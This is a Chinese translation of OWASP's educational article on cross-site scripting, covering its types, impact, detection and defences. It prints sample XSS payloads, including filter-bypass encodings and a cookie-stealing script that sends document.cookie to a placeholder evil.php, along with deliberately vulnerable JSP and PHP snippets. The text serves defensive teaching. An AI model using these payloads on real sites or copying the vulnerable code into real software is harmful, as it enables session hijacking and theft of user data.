[TOC]

*最新版本 (mm/dd/yy): 03/6/2018*

翻译自[Cross-site Scripting (XSS)](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) "Cross-site Scripting (XSS)")

# 概览
- 跨站点脚本（XSS）是注入攻击的一种，将恶意脚本注入到其他正常可信的网站中。当攻击者使用Web应用程序将恶意代码（通常以浏览器端脚本的形式）发送给不同的最终用户时，就会发生XSS攻击。 引发XSS攻击的漏洞非常普遍，并且发生在Web应用程序使用来自用户的输入内容，而不会对其生成的输出进行验证或编码的任何地方。
- 攻击者可以利用XSS来向可信的用户发送恶意脚本。最终用户的浏览器并不知晓这个脚本是不可信的，并且会执行这个脚本。由于浏览器认为该恶意脚本来自于可信的源，所以它可以获取任意cookies，会话令牌，或浏览器保留并与该网站一起使用的其他敏感信息。这些脚本甚至可以覆写HTML网页的内容。更多关于不同种类的XSS漏洞详情请参考：[跨站点脚本的类型](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting "跨站点脚本的类型")

# 相关安全活动
## 如何避免跨站脚本漏洞

- [请参阅XSS（跨站点脚本）预防备忘录](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet "请参阅XSS（跨站点脚本）预防备忘录")
- [请参阅基于DOM的XSS预防备忘录](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet "请参阅基于DOM的XSS预防备忘录")
- 请参阅有关[网络钓鱼](https://www.owasp.org/index.php/Phishing "网络钓鱼")的[OWASP开发指南](https://www.owasp.org/index.php/Category:OWASP_Guide_Project "OWASP开发指南")文章。
- 请参阅关于[数据验证](https://www.owasp.org/index.php/Data_Validation "数据验证")的[OWASP开发指南](https://www.owasp.org/index.php/Category:OWASP_Guide_Project "OWASP开发指南")文章。

## 如何审计跨站脚本漏洞的代码

- 查看[OWASP代码审查指南](https://www.owasp.org/index.php/Category:OWASP_Code_Review_Project "OWASP代码审查指南")文章“[审查跨站脚本漏洞的代码](https://www.owasp.org/index.php/Reviewing_Code_for_Cross-site_scripting "审查跨站脚本漏洞的代码")”。

## 如何测试跨站脚本漏洞

- 请参阅最新的[OWASP测试指南](https://www.owasp.org/index.php/Category:OWASP_Testing_Project "OWASP测试指南")文章，了解如何测试各种XSS漏洞。
- [反射型跨站点脚本测试（OWASP-DV-001）](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OWASP-DV-001) "反射型跨站点脚本测试（OWASP-DV-001）")
- [存储型跨站点脚本测试（OWASP-DV-002）](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OWASP-DV-002) "存储型跨站点脚本测试（OWASP-DV-002）")
- [基于DOM的跨站脚本测试（OWASP-DV-003）](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OWASP-DV-003) "基于DOM的跨站脚本测试（OWASP-DV-003）")

# 漏洞描述

跨站脚本漏洞（XSS）发生于：

- 数据通过不受信任的来源进入Web应用程序，通常是Web请求。
- 数据包含在发送给Web用户且不经过恶意内容验证的动态内容中。

发送到Web浏览器的恶意内容通常采用JavaScript段的形式，但也可能包含HTML，Flash或浏览器可能执行的任何其他类型的代码。基于XSS的各种攻击几乎是无限的，但它们通常包括向攻击者发送隐私数据（如cookies或其他会话信息），将受害者重定向到由攻击者控制的网页内容，或在易受攻击的网站的幌子下在用户计算机上执行其他恶意操作 。

## [存储型和反射型XSS攻击](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)#Stored_and_Reflected_XSS_Attacks "存储型和反射型XSS攻击")

XSS攻击通常被分为两种类型：存储型和反射型。还有第三种类型的XSS攻击，称为DOM Based XSS，不广为人知，在这里单独讨论。

### 存储型XSS攻击
存储型攻击是指将注入的脚本永久存储在目标服务器上（如数据库，消息论坛，访问者日志，注释字段等）的攻击。受害者随后在向服务器请求存储的信息时会接收恶意脚本。存储型XSS有时也被称为持久型或I型XSS。

### 反射型XSS攻击
反射攻击是那些将脚本注入到在Web服务器上的响应，例如错误消息，搜索结果或任何其他响应，包括发送到服务器的部分或全部输入作为请求的一部分。反射型攻击通过其他途径传递给受害者，例如电子邮件或其他网站。当用户被诱骗点击恶意链接后，当用户被欺骗点击恶意链接，提交特制表单或者甚至浏览恶意网站时，注入的代码会传播到易受攻击的网站，将攻击反射到用户的浏览器。浏览器随后会执行恶意代码，因为它来自"可信的"服务器。反射型XSS有时也被称为非持久型或II型XSS。

## 其他类型的XSS漏洞
除了反射型和存储型XSS，其他类型的XSS，[基于DOM的XSS攻击](https://www.owasp.org/index.php/DOM_Based_XSS "基于DOM的XSS攻击")于2005年被[Amit Klein](http://www.webappsec.org/projects/articles/071105.shtml "Amit Klein")确认。OWASP建议按照OWASP文章：[跨站点脚本类型](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting "跨站点脚本类型")中所述的XSS分类，其中涵盖所有这些XSS术语，将它们组织成[存储型,反射型、服务器,客户端]的矩阵，其中基于DOM的XSS是客户端XSS的子集。

## XSS攻击的危害
无论是存储型还是反射型（或基于DOM），XSS攻击的后果都是相同的。不同之处是有效载荷是怎样到达服务器的。不要被愚蠢地认为“只读”或“手册”网站不容易受到严重的反射型XSS攻击。XSS可能会给最终用户带来各种问题，严重程度可以从骚扰到完全帐户控制。最严重的服务端XSS攻击涉及泄露用户的会话cookie，允许攻击者劫持用户的会话并接管该帐户。攻击的其他威胁包括泄露用户文件、安装木马程序、重定向用户到其他网页，或者修改展现的内容。一个XSS漏洞可以让攻击者修改新闻稿或新闻项目，可能会影响公司的股价或降低消费者信心。制药网站上的XSS漏洞可能允许攻击者修改导致剂量过量的剂量信息。有关这些类型的攻击的更多信息，请参阅[内容欺骗](https://www.owasp.org/index.php/Content_Spoofing "内容欺骗")。

## 如何确认XSS漏洞
XSS漏洞难以被确认和从web应用程序中移除。找到缺陷的最佳方法是对代码执行安全审计，并搜索所有来自HTTP请求的输入可能进入HTML输出的地方。请注意，各种不同的HTML标签可用于传输恶意JavaScript。Nessus，Nikto和其他一些可用的工具可以帮助扫描网站上的这些缺陷，但这只能解决表面的上问题。如果某个网站的某个部分有漏洞，那么很可能还有其他问题。

## 如何防御XSS漏洞

- [OWASP XSS预防备忘录](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet "OWASP XSS预防备忘录")介绍了针对XSS的主要防御措施。
- 此外，关闭所有Web服务器上的HTTP TRACE支持也是至关重要的。攻击者即使在document.cookie在客户端被禁止或者不支持的情况下也能盗取cookie数据。当用户向论坛发布恶意脚本时会挂载此攻击，因此当其他用户单击该链接时，会触发异步HTTP跟踪调用，从服务器收集用户的Cookie信息，然后将其发送到另一个收集的cookie信息的恶意服务器，使攻击者可以挂载会话劫持攻击。 通过在所有网络服务器上关闭对HTTP TRACE的支持，可以轻松解决这个问题。
- [OWASP ESAPI项目](https://www.owasp.org/index.php/ESAPI "OWASP ESAPI项目")以几种语言制作了一组可重用的安全组件，包括验证和转义例程以防止参数篡改和注入XSS攻击。 此外，[OWASP WebGoat Project](https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project "OWASP WebGoat Project")培训应用程序还提供跨站脚本和数据编码课程。

## 备用XSS语法
### 在属性中使用脚本的XSS
可以在不使用`<script> </ script>`标记的情况下进行XSS攻击。 其他标签可以做完全相同的事情，例如：
`<body onload=alert('test1')>`
或其他属性如：onmouseover，onerror
onmouseover:
`<b onmouseover=alert('Wufff!')>click me!</b>`
onerror:
`<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>`

### 通过编码URI方案使用脚本的XSS
如果我们需要绕过Web应用程序过滤器，我们可能会尝试对字符串字符进行编码，例如：`a=&#X41`（UTF-8）并将其用于IMG标记中：
`<IMG SRC=j&#X41vascript:alert('test2')>`
许多不同的UTF-8编码符号给了我们更多的可能性。

### 使用代码编码的XSS
我们可以用base64编码脚本，并将其放置在META标记中。 这样我们完全摆脱了alert（）。 有关此方法的更多信息可以在[RFC 2397](https://tools.ietf.org/html/rfc2397 "RFC 2397")中找到
`<META HTTP-EQUIV="refresh"
CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">`
这些和其他的例子可以在OWASP XSS过滤漏洞作弊表中找到，它是真正的备用XSS语法攻击的百科全书。

# 漏洞示例
跨站脚本攻击可能发生在任何允许恶意用户将未处理的材料发布到可信网站以供其他有效用户使用的地方。最常见的例子可以在提供基于web的邮件列表式功能的公告栏网站中找到。

## 示例1
- 接下的的JSP代码段从HTTP请求中读取一个雇员的ID，eid并将其显示给用户

```javascript
<% String eid = request.getParameter("eid"); %> 
	...
	Employee ID: <%= eid %>'
```

- 在eid仅包含基本字母时这段代码能正常运行。如果eid包括源字符或者源代码，则该代码将由Web浏览器在显示HTTP响应时执行。原本这并不会导致如此大的危害。毕竟，谁会输入一串导致恶意代码在他们自己的电脑上运行URL呢？真正的威胁在于攻击者可以创建恶意URL，然后使用电子邮件或者社会工程学来欺骗受害访问该URL的链接。当受害者点击该链接时，他们无意中通过易受攻击的Web应用程序将恶意内容反射回自己的计算机。这种利用易受攻击的Web应用程序的机制称为反射型XSS。

## 示例2
- 接下来的JSP代码段用一个给定的ID向数据查询信息并显示相应的雇员姓名

```javascript
<%... 
	 Statement stmt = conn.createStatement();
	 ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
	 if (rs != null) {
	  rs.next(); 
	  String name = rs.getString("name");
	%>

	Employee Name: <%= name %>
```
- 就像示例一里的一样，这段代码的功能在名字值无害的情况下可以正常运行，但没有任何手段来防御有害值导致的漏洞。同样，这段代码看起来不太危险，因为名称的值是从数据库中读取的，数据库的内容显然是由应用程序管理的。但是，如果名称的值来自用户提供的数据，那么数据库可能成为传播恶意内容的渠道。在没有对数据库中存储的所有数据进行输入验证的情况下，攻击者可以在用户的浏览器执行恶意指令。这种被称为存储型XSS的攻击特别隐蔽，因为由数据存储造成的间接性使得识别威胁变得更加困难，并且增加了攻击会影响多个用户的可能性。在网站向用户提供留言板时，这种形式的XSS攻击开始。攻击者在留言板的输入中包含了Javascript代码，并且随后访问该留言页面的所有用户将会执行这段恶意代码。

- 如示例所示，XSS漏洞是由HTTP响应中包含未验证数据的代码引起的。XSS攻击者可以通过三种攻击媒介向受害者发起攻击：
  - 如示例一，数据直接被HTTP请求读取并反射回HTTP响应中。当攻击者导致用户向易受攻击的Web应用程序提供危险内容时，反射型XSS攻击就会发生，然后反射给用户并由Web浏览器执行。传递恶意内容的最常见机制是将其作为参数包含在公开发布或通过电子邮件直接发送给受害者的URL中。以这种方式构建的URL构成许多网络钓鱼计划的核心，攻击者说服受害者访问指向易受攻击网站的URL。当站点将攻击者的载荷反射到用户后，载荷将执行并继续从用户的机器向攻击者传输隐私信息，例如可能包含会话信息的Cookie，或执行其他恶意活动。
  - 如示例2，应用将危险数据存储入数据库或者其他可信的数据存储空间。该危险数据将作为动态内容的一部分被读回应用中。存储型XSS攻击发生在攻击者向数据存储中注入危险内容时，这些内容稍后会被读取并包含在动态内容中。从攻击者的角度来看，注入恶意内容的最佳位置是显示给许多用户或攻击者感兴趣的用户的区域。这些用户通常在应用程序中拥有更高的权限，或与敏感数据交互，这对攻击者来说很有价值。如果这些用户其中一个执行了恶意内容，攻击者可以代表用户执行特权操作或者访问属于用户的隐私数据。
  - 应用程序外部的源将危险数据存储在数据库或其他数据存储中，然后危险数据作为可信数据读回应用程序并包含在动态内容中。

# 攻击示例
## 示例1：cookie抓取
- 如果该应用不对输入的数据进行验证，攻击者可以轻易地从认证的用户窃取Cookie。所有攻击者所要做的就是在任何发布的输入（即：留言板，私人消息，用户配置文件）中放置以下代码：

```javascript
<SCRIPT type="text/javascript">
var adr = '../evil.php?cakemonster=' + escape(document.cookie);
</SCRIPT>
```

上面的代码会传递cookie的转义内容（根据RFC内容必须在通过HTTP协议使用GET方法发送之前将其转义）传递给evil.php脚本中的“cakemonster”变量。攻击者随后查看evil.php脚本的返回（cookie抓取者脚本通常会将cookie写入文件）并使用

## 示例2：错误页面
- 假设我们有一个错误页面，它处理对一个不存在的页面的请求，一个经典的404错误页面。 我们可以使用下面的代码作为示例来告知用户缺少什么特定的页面：

```html
<html>
<body>

<? php
print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
?>

</body>
</html>
```

让我们看看它是如何工作的
`http://testsite.test/file_which_not_exist`
在响应中我们得到
`Not found: /file_which_not_exist`
现在强制在锁舞页面中包含我们的代码
`http://testsite.test/<script>alert("TEST");</script>`
结果是
`Not found: / (但包含JavaScript代码 <script> alert（“TEST”）; </script>)`
我们已经成功地注入了代码，我们的XSS！这意味着什么？例如，我们可能会利用这个漏洞来试图窃取用户的会话cookie。

# 相关攻击

- [XSS攻击](https://tinytracer.com/archives/owasp%e4%b8%aa%e4%ba%ba%e6%b1%89%e5%8c%96%e6%94%bb%e5%87%bb%e7%b3%bb%e5%88%97%e5%a4%a7%e5%85%a8%ef%bc%9a%e8%b7%a8%e7%ab%99%e7%82%b9%e8%84%9a%e6%9c%ac%ef%bc%88xss%ef%bc%89/ "XSS攻击")
- [类别：注入攻击](https://www.owasp.org/index.php/Category:Injection_Attack "类别：注入攻击")
- [调用不可信的移动代码](https://www.andseclab.cn/2018/04/15/owasp%e6%b1%89%e5%8c%96%e6%94%bb%e5%87%bb%e7%b3%bb%e5%88%97%e5%a4%a7%e5%85%a8%e5%9b%9b%e5%8d%81%e4%b8%89%e7%a7%bb%e5%8a%a8%e4%bb%a3%e7%a0%81-%e8%b0%83%e7%94%a8%e4%b8%8d%e5%8f%af%e4%bf%a1/ "调用不可信的移动代码")
- [跨站点历史操作（XSHM）](https://tinytracer.com/archives/%ef%bc%88owasp%e4%b8%aa%e4%ba%ba%e6%b1%89%e5%8c%96%ef%bc%89%e6%94%bb%e5%87%bb%e7%b3%bb%e5%88%97%e5%a4%a7%e5%85%a8%ef%bc%9a%e8%b7%a8%e7%ab%99%e7%82%b9%e5%8e%86%e5%8f%b2%e6%93%8d%e4%bd%9c/ "跨站点历史操作（XSHM）")

# 相关漏洞

- [类别：输入验证漏洞](https://www.owasp.org/index.php/Category:Input_Validation_Vulnerability "类别：输入验证漏洞")
- [跨站点脚本漏洞](https://www.owasp.org/index.php/Cross_Site_Scripting_Flaw "跨站点脚本漏洞")
- [跨站点脚本的类型](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting "跨站点脚本的类型")

# 相关防御

- [类别：输入验证](https://www.owasp.org/index.php/Category:Input_Validation "类别：输入验证")
- [HTML实体编码](https://www.owasp.org/index.php?title=HTML_Entity_Encoding&action=edit&redlink=1 "HTML实体编码")
- [输出验证](https://www.owasp.org/index.php?title=Output_Validation&action=edit&redlink=1 "输出验证")
- [规范化](https://www.owasp.org/index.php/Canonicalization "规范化")

# 参考

- OWASP的[XSS（跨站脚本）预防备忘录](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet "XSS（跨站脚本）预防备忘录")
- OWASP构建安全Web应用程序和Web服务指南，第8章：[数据验证](https://www.owasp.org/index.php/Data_Validation "数据验证")
- OWASP测试指南，[测试反射型跨站脚本（OWASP-DV-001）](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OWASP-DV-001) "测试反射型XSS漏洞（OWASP-DV-001）")
- OWASP测试指南，[测试存储型跨站脚本（OWASP-DV-002）](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OWASP-DV-002) "测试存储型XSS漏洞（OWASP-DV-002）")
- OWASP测试指南，[测试基于DOM的跨站点脚本（OWASP-DV-003）](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OWASP-DV-003) "测试基于DOM的跨站点脚本（OWASP-DV-003）")
- OWASP的[如何构建HTTP请求验证引擎（使用OWASP的Stinger进行J2EE验证）](https://www.owasp.org/index.php/How_to_Build_an_HTTP_Request_Validation_Engine_for_Your_J2EE_Application "如何构建HTTP请求验证引擎（使用OWASP的Stinger进行J2EE验证）")
- Google Code最佳实践指南：[http://code.google.com/p/doctype/wiki/ArticlesXSS](http://code.google.com/p/doctype/wiki/ArticlesXSS "http：//code.google.com/p/doctype/wiki/ArticlesXSS")
- 跨站点脚本常见问题解答：[http://www.cgisecurity.com/articles/xss-faq.shtml](http://www.cgisecurity.com/articles/xss-faq.shtml "http://www.cgisecurity.com/articles/xss-faq.shtml")
- OWASP [XSS过滤漏洞备忘录](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet "XSS过滤漏洞备忘录")
- 关于恶意HTML标记的CERT咨询：[http://www.cert.org/advisories/CA-2000-02.html](http://www.cert.org/advisories/CA-2000-02.html "http://www.cert.org/advisories/CA-2000-02.html")
- CERT“了解防范恶意内容”[http://www.cert.org/tech_tips/malicious_code_mitigation.html](http://www.cert.org/tech_tips/malicious_code_mitigation.html "http://www.cert.org/tech_tips/malicious_code_mitigation.html")
- 了解CSS漏洞的原因和影响：[http://www.technicalinfo.net/papers/CSS.html](http://www.technicalinfo.net/papers/CSS.html "http://www.technicalinfo.net/papers/CSS.html")
- XSSed - 跨站点脚本（XSS）信息和镜像存档易受攻击的网站[http://www.xssed.com](http://www.xssed.com "http://www.xssed.com")